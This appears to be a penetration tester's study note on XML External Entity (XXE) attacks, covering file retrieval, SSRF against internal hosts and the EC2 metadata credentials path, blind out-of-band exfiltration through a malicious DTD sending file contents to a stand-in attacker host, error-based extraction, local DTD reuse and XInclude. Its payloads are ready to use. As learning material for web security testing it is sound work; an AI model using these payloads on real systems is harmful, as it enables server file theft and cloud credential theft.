An **XML External Entity (XXE)** attack is a vulnerability that *abuses features of XML parsers/data*. It often *allows an attacker to interact with any backend or external systems that the application itself can access* and can allow the attacker to read the file on that system. They can also cause `DOS` attack or could use XXE to perform [[Website Hacking/Web Servers/Web Server Attacks/SSRF]] inducing the web application to make requests to other applications. XXE may even enable `port scanning` and lead to `remote code execution`.


=== multi-column-start: ID_gpa4
```column-settings
Number of Columns: 2
Largest Column: standard
```
# XML Internal Entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY garr "ExampleEntity"> ]>
<productId>&garr;</productId>
```

**Local values are referenced**

=== end-column ===
# XML External Entity
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId>
```

**External values are referenced**

=== multi-column-end


There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).  
1) **In-band** XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
2) **Out-of-band** XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

---
# XXE Discovery Steps
1) If `XML` in the request, declare an **Internal Entity**
2) Reference(Declare) the entity in an existing XML element
3) If that works, Begin Exploitation!

---
# In-band XXE
## Exploiting XXE to retrieve files
To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:
-   Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.
-   Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

**Exploit**
```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```


## Exploiting XXE to perform SSRF attacks
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

- [ ] **Exploiting EC2 Metadata Endpoint** 
	- Default Directory: `http://169.254.169.254/latest/meta-data/iam/security-credentials/[username]/`
	- Could be `admin`, `ec2-default-ssm`, `s3access` (Try to bruteforce this or if it's visible in the Response then Better!)


---
# Out-of-Band XXE
- **Simple Payload**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://[domain name]"> ]>
```

Sometimes, XXE attacks using regular entities are <mark style="background: #ABF7F7A6;">blocked</mark>. In this situation, you might be able to use <mark style="background: #FFF3A3A6;">XML parameter entities</mark> instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the *percent character* before the entity name:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

And second, parameter entities are *referenced using the percent character* instead of the usual ampersand
`%myparameterentity;`

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows :-
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://[domain name]"> %xxe; ]>
```


## Exploiting Blind XXE to exfiltrate data out-of-band
It involves the attacker hosting a malicious `DTD` on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious `DTD` to exfiltrate the contents of the `/etc/passwd` file is as follows:
```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">    <!-- Either use Exploit Server or Burp Collaborator, Check the Request -->
%eval;
%exfiltrate;
```

This `DTD` carries out the following steps:
-   Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
-   Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
-   Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
-   Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.

Finally, the attacker must submit the following XXE payload to the vulnerable website:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/exploit"> %xxe;]>`

This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause the XML parser to *fetch* the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the `/etc/hostname` file is transmitted to the attacker's server.

%%  Note: This technique *might not work* with some file contents, including the newline characters contained in the `/etc/passwd` file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead.  %%


## Exploiting Blind XXE to retrieve data via error messages
You can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval; 
%error;
```

This DTD carries out the following steps:
-   Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
-   Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `error`. The `error` entity will be evaluated by loading a nonexistent file whose name contains the value of the `file` entity.
-   Uses the `eval` entity, which causes the dynamic declaration of the `error` entity to be performed.
-   Uses the `error` entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the `/etc/passwd` file.

Finally, the attacker must submit the following XXE payload to the vulnerable website:
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/exploit"> %xxe;]>`


## Exploiting blind XXE by repurposing a local DTD

**Q) When to use a Local DTD?**
1) We can declare & reference entities, but we can't exfilterate data **In-Band**
2) Egress filtering prevents **Out-of-Band** calls to our server


A *local DTD* is DTD file that already exists on the target server. We leverage this DTD file by causing an error to Exfilterate data.

Check for **variance** in application **response**, like `File not found` by using previous payloads which access a file!

- To find DTD files, use this [Wordlist](https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt)
![[Pasted image 20230708122117.png]]

- After you find the correct entities, go [here](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) & use the Payload!

---
# XInclude Attacks
If the Request doesn't take XML Input :-
1) Use Burp Extension **Content Type Converter** & try to convert it to XML/JSON, check if it takes the input.
2) If it doesn't try to call a **random entity**
	URL Encode the "&" symbol else it'll be treated like `http://0a5c0030033d1c2a8089c18a00890049.web-security-academy.net/product?productId=&lol&storeId=1`
![[Pasted image 20230708130950.png]]

3) If this happens, it means that application is *parsing XML*. Enter the Exploit in the ID Parameter!

**Exploit**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

##### X-Include Use cases
- We don't have control over the "Entire" XML document, only a part of it.
- The Application returns the contents of an Element we control!

---
# XXE via File Upload
![[49732.pdf]]